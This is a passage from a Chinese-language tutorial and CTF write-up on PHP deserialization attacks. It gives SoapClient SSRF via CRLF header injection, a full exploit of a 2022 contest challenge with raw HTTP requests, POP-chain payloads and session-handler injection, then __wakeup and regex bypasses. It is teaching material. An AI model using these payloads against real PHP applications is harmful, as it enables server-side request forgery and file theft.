存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。

```
函数形式：
    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
第一个参数为指明是否为wsdl模式，为null则为非wsdl模式
wsdl，就是一个xml格式的文档，用于描述Web Server的定义
第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间
```

首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法

```
<?php
$a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://108.166.201.16:5555/path'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->not_exists_function();
```

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png)

**CRLF**

从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制

```
<?php
$a = new SoapClient(null,array('uri'=>"bbb\r\n\r\nccc\r\n", 'location'=>'http://127.0.0.1:5555/path'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->not_exists_function();
```

第一个参数是用来指明是否是 wsdl 模式。

第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png)

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png)

但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据

在header里User-Agent在Content-Type前面

```
https://www.php.net/manual/zh/soapclient.soapclient.php :
The user_agent option specifies string to use in User-Agent header.
```

user_agent同样可以注入CRLF，控制Content-Type的值

```
<?php
$target = 'http://127.0.0.1:5555/path';
$post_string = 'data=something';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=my_session'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo $aaa;
$c = unserialize($aaa);
$c->not_exists_function();
?>
```

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png)

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png)

如上，使用SoapClient[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)+CRLF**可以生成任意POST请求**。

# 安洵杯2022 babyphp

这题结合了pop链构造，php原生类使用，和php session反序列化的利用

index.php

```
<?php
header("Content-Type: text/html; charset=utf-8");
class A
{
    public $a;
    public $b;

    public function __wakeup()
    {
        $this->a = "babyhacker";
        print ("this is wakeup");
        print ($this->a);
    }

    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            print ("this is invoke");
            print ($this->a);
            $this->b->uwant();
        }
    }
}

class B
{
    public $a;
    public $b;
    public $k;

    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}

class C{
    public $a;
    public $c;

    public function __toString(){
        $cc=$this->c;
        return $cc();
    }
    public function uwant()
    {
        if($this->a=="phpinfo"){
            phpinfo();
        }else{
            print (array(reset($_SESSION),$this->a));
            call_user_func(array(reset($_SESSION),$this->a));
        }
    }
}



if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
else{
    session_start();
    if (isset($_POST["pop"])) {
        unserialize($_POST["pop"]);
    }
}
var_dump($_SESSION);
highlight_file(__FILE__);
```

flag.php

```
<?php
session_start();
highlight_file(__FILE__);
//flag在根目录下
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
        $f1ag=implode(array(new $_GET['a']($_GET['b'])));
    $_SESSION["F1AG"]= $f1ag;
}else{
       echo "only localhost!!";
}
```

### 尝试获取phpinfo,构造pop链条

```
<?php
highlight_file(__FILE__);
header("Content-Type: text/html; charset=utf-8");
class A
{
    public $a;
    public $b;

    public function __wakeup()
    {
        $this->a = "babyhacker";
        print ("this is wakeup");
        print ($this->a);
    }

    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            print ("this is invoke");
            print ($this->a);
            $this->b->uwant();
        }
    }
}

class B
{
    public $a;
    public $b;
    public $k;

    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}

class C{
    public $a;
    public $c;

    public function __toString(){
        $cc=$this->c;
        return $cc();
    }
    public function uwant()
    {
        if($this->a=="phpinfo"){
            phpinfo();
        }else{
            print (array(reset($_SESSION),$this->a));
            call_user_func(array(reset($_SESSION),$this->a));
        }
    }
}


$B = new B();
$B->a=new C();
$B->a->c=new A();
$B->a->c->b=$B->a;
$B->a->c->a="0e215962017";  \\双md5绕过
$B->a->a="phpinfo";
print (serialize($B));
```

生成如下payload:

然后要绕过这个A类里的wakeup函数,使用fastdestruct,在末尾去点个}即可

```
O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";s:7:"phpinfo";s:1:"c";O:1:"A":2:{s:1:"a";s:11:"0e215962017";s:1:"b";r:2;}}s:1:"b";N;s:1:"k";N;
```

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572452999-4c7c0d9f-7e02-4554-b6fe-3cb50bd081e1.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572452999-4c7c0d9f-7e02-4554-b6fe-3cb50bd081e1.png)

### php session反序列化

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572514590-86d553ce-17ed-4ceb-9380-f387e618fb16.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572514590-86d553ce-17ed-4ceb-9380-f387e618fb16.png)

php中的seiion中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的方式就是由配置项session_save_handler来进行确定的，默认是以文件的方式存储。

存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容

在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。

当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。

例如传入

```
$_SESSION['name']='|O:5:"Smi1e":1:{s:4:"test";s:3:"AAA";}';
```

序列化引擎使用的是php_serialize，那么储存的session文件为

```
a:1:{s:4:"name";s:5:"|O:5:"Smi1e":1:{s:4:"test";s:3:"AAA";}";}
```

而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:“name”;s:5:”当作键名，而把O:5:“Smi1e”:1:{s:4:“test”;s:3:“AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。

所以我们就可以利用这点来构造session序列化,

```
POST /?d0g3=php_serialize&baby=session.serialize_handler

sess=|xxx
```

而在flag.php中有

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572974964-ddcf9fb4-9d32-4e4e-9206-4bdb6d083974.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572974964-ddcf9fb4-9d32-4e4e-9206-4bdb6d083974.png)

我们显而易见是要构造soapclient类去SSRF,然后利用flag中的函数构造原生类去读取文件

脚本如下:

```
<?php
$target = 'http://127.0.0.1:80/flag.php?a=DirectoryIterator&b=glob:///*f*';
$post_string = 'HY=666';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);

?>
```

注意在本题中由于涉及倒session问题，PHPSESSID一定要一致

最终可得到payload:

```
POST /?d0g3=php_serialize&baby=session.serialize_handler HTTP/1.1
Host: 47.108.29.107:10354
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 502
Origin: http://47.108.29.107:10354
Connection: close
Referer: http://47.108.29.107:10354/
Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
Upgrade-Insecure-Requests: 1

sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A62%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2F%2Af%2A%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

我们可以通过这种办法把session写进去

### 使用pop链触发ssrf

可以在类中看到调用

```
call_user_func(array(reset($_SESSION), $this->a))
```

这里call_user_func的用法，就是执行类中的静态函数或者一个对象的方法

如果我们要ssrf访问flag.php,我们就使用原生类SoapClient该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。

同时__call的触发方法就是在调用这个对象不存在的一个方法时触发，刚好符合我们的需求

所以我们稍微修改下pop链条就可以触发ssrf

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574331967-d04a8061-386d-4121-852e-17431ba2c643.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574331967-d04a8061-386d-4121-852e-17431ba2c643.png)

```
O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";s:6:"sakura";s:1:"c";O:1:"A":2:{s:1:"a";s:11:"0e215962017";s:1:"b";r:2;}}s:1:"b";N;s:1:"k";N;
```

### 利用过程

1.先利用session反序列化传入session的值

```
POST /?d0g3=php_serialize&baby=session.serialize_handler HTTP/1.1
Host: 47.108.29.107:10354
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 502
Origin: http://47.108.29.107:10354
Connection: close
Referer: http://47.108.29.107:10354/
Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
Upgrade-Insecure-Requests: 1

sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A62%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2F%2Af%2A%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574440522-428f74a1-d1f1-4232-beb7-51070680d9f1.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574440522-428f74a1-d1f1-4232-beb7-51070680d9f1.png)

2.调用pop链进行SSRF

```
POST / HTTP/1.1
Host: 47.108.29.107:10354
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 279
Origin: http://47.108.29.107:10354
Connection: close
Referer: http://47.108.29.107:10354/
Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
Upgrade-Insecure-Requests: 1

pop=O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22C%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22phpinf%22%3Bs%3A1%3A%22c%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A11%3A%220e215962017%22%3Bs%3A1%3A%22b%22%3Br%3A2%3B%7D%7Ds%3A1%3A%22b%22%3BN%3Bs%3A1%3A%22k%22%3BN%3B
```

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574489346-916347ef-296e-406f-9900-d79d5a42f78d.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574489346-916347ef-296e-406f-9900-d79d5a42f78d.png)

我们成功找到了根目录下flag文件的名称,接下来同理，构造原生类读取文件即可

1.session反序列化

```
POST /?d0g3=php_serialize&baby=session.serialize_handler HTTP/1.1
Host: 47.108.29.107:10354
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 493
Origin: http://47.108.29.107:10354
Connection: close
Referer: http://47.108.29.107:10354/
Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
Upgrade-Insecure-Requests: 1

sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A63%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DSplFileObject%26b%3D%2Ff1111llllllaagg%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

2.触发读flag文件(这里用的SplFileObject原生类)

这里的数据包和上面一样，不过这题反序列化的时候要等挺长时间的

3.访问主页面，记得不要再传参了，session会被覆盖

[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574785928-ec75acf4-bc07-40e5-b354-204c3470effd.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574785928-ec75acf4-bc07-40e5-b354-204c3470effd.png)

# 一、基础

## 1、简介

序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。php 将数据序列化和反序列化会用到两个函数：serialize 将对象格式化成有序的字符串；unserialize 将字符串还原成原来的对象。序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。

## 2、序列化的格式

```php
<?php
$user=array('xiao','shi','zi');
$user=serialize($user);
echo($user.PHP_EOL);
print_r(unserialize($user));

/*
输出：
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
Array
(
[0] => xiao
[1] => shi
[2] => zi
)

a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
a:array代表是数组，后面的3说明有三个属性
i:代表是整型数据int，后面的0是数组下标
s:代表是字符串，后面的4是因为xiao长度为4
依次类推
*/
```

序列化后的内容只有成员变量，没有成员函数，比如下面的例子：

```php
<?php
class test{
public $a;
public $b;
function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
?>

/*
输出：
O:4:"test":2:{s:1:"a";s:9:"xiaoshizi";s:1:"b";s:8:"laoshizi";}
```

而如果变量前是protected，则会在变量名前加上\x00*\x00,private则会在变量名前加上\x00类名\x00,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下：

```php
<?php
class test{
protected $a;
private $b;
function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
echo urlencode(serialize($a));
?>

/*
输出：
O:4:"test":2:{s:4:" * a";s:9:"xiaoshizi";s:7:" test b";s:8:"laoshizi";}
O%3A4%3A%22test%22%3A2%3A%7Bs%3A4%3A%22%00%2A%00a%22%3Bs%3A9%3A%22xiaoshizi%22%3Bs%3A7%3A%22%00test%00b%22%3Bs%3A8%3A%22laoshizi%22%3B%7D
*/
```

## 3、魔术方法

```php
__construct() //对象被实例化时触发
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

# 二、反序列化漏洞利用（绕过）

## 1、php7.1+反序列化对类属性不敏感

前面说了如果变量前是protected，序列化结果会在变量名前加上\x00*\x00，但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\x00*\x00也依然会输出abc。

```php
<?php
class test{
protected $a;
public function __construct(){
$this->a = 'abc';
}
public function __destruct(){
echo $this->a;
}
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');

#输出：abc
```

例题：[网鼎杯 2020 青龙组]AreUSerialz

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

首先找到可利用的危险函数**file_get_content()**然后逐步回溯发现是__destruct()--> process()-->read()这样一个调用过程。

两个绕过：1.__destruct()中要求op！===2且process()中要求op==2

这样用$op=2绕过

2.绕过is_valid()函数，private和protected属性经过序列化都存在不可打印字符在32-125之外，但是对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。

```php
<?php
class FileHandler {
  public $op = 2;
  public $filename = "/var/www/html/flag.php";
  public $content;
}
$obj = new FileHandler();
echo serialize($obj);
?>
/*输出：
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:22:"/var/www/html/flag.php";s:7:"content";N;}
*/
<?php
class FileHandler {

    public $op=2;
    public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
    public $content;

}

$obj = new FileHandler();
echo serialize($obj);
?>
/*输出：
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
*/
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-31e65fabd63c36943186e61b8cd592f61a38250e.png)

## 2、绕过__wakeup(CVE-2016-7124)

```php
版本：
PHP5 < 5.6.25
PHP7 < 7.0.10
```

利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。

对于下面这样一个自定义类：

```php
<?php
class test{
public $a;
public function __construct(){
$this->a = 'abc';
}
public function __wakeup(){
$this->a='666';
}
public function __destruct(){
echo $this->a;
}
}
$t='O:4:"test":1:{s:1:"a";s:4:"yyds";}';
unserialize($t);
```

如果执行unserialize('O:4:"test":1:{s:1:"a";s:4:"yyds";}');输出结果为666；

而把对象属性个数的值增大执行unserialize('O:4:"test":2:{s:1:"a";s:4:"yyds";}');输出结果为yyds。

例题：[极客大挑战 2019]PHP

题目给出提示，网站存在备份。用dirsearch扫描出存在www.zip 备份文件，下载下来开始审计。

index.php里规定了反序列化的参数,而且调用了class.php

```php
<head>
  <meta charset="UTF-8">
  <title>I have a cat!</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
      <link rel="stylesheet" href="style.css">
</head>
<style>
    #login{   
        position: absolute;   
        top: 50%;   
        left:50%;   
        margin: -150px 0 0 -150px;   
        width: 300px;   
        height: 300px;   
    }   
    h4{   
        font-size: 2em;   
        margin: 0.67em 0;   
    }
</style>
<body>

<div id="world">
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
    </div>
    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</div>
<script src='http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'></script>
<script  src="index.js"></script>
</body>
</html>
```

解题的重点看来就在class.php中了

```php
<?php
include 'flag.php';

error_reporting(0);

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

        }
    }
}
?>

<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

审计源码我们可以得出,当username=admin且password=100时得到flag,但是 weakup()魔术方法会把username重置为guest,因此我们需要绕过weakup()。

先构造payload生成序列化字符串

```php
<?php
class Name {

private $username='admin';
private $password=100;

}
$a=new Name;
echo serialize($a);

?>

/*输出：
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
*/
```

最终传入的序列化字符串：

```php
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失且本题的php版本低于7.1

## 3、绕过部分正则

preg_match('/^O:\d+/')匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点

### 利用加号绕过

注意在url里传参时+要编码为%2B

```php
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}'; //+号绕过 
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
```

### serialize( array( a) );

a为要反序列化的对象（序列化结果开头是a，不影响作为数组元素的$a的析构）

```php
serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```

### 利用引用使两值恒等

```php
<?php
class test{
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'abc';
        $this->b= &$this->a;
    }
    public function  __destruct(){

    if($this->a===$this->b){
        echo 666;
   }
}
}
$a = serialize(new test());
```

上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等

### 16进制绕过字符过滤

```php
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
```

## 4、反序列化字符逃逸

当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。

### 反序列化字符变多逃逸案例

假设我们先定义一个user类，然后里面一共有3个成员变量：username、password、isVIP。

```php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}
```

可以看到当这个类被初始化的时候，isVIP变量默认是0，并且不受初始化传入的参数影响。

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

$a = new user("admin","123456");
$a_seri = serialize($a);

echo $a_seri;
?>
```

这一段程序的输出结果如下：

```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

可以看到，对象序列化之后的isVIP变量是0。

这个时候我们增加一个函数，用于对admin字符进行替换，将admin替换为hacker，替换函数如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hacker",$s);
}

$a = new user("admin","123456");
$a_seri = serialize($a);
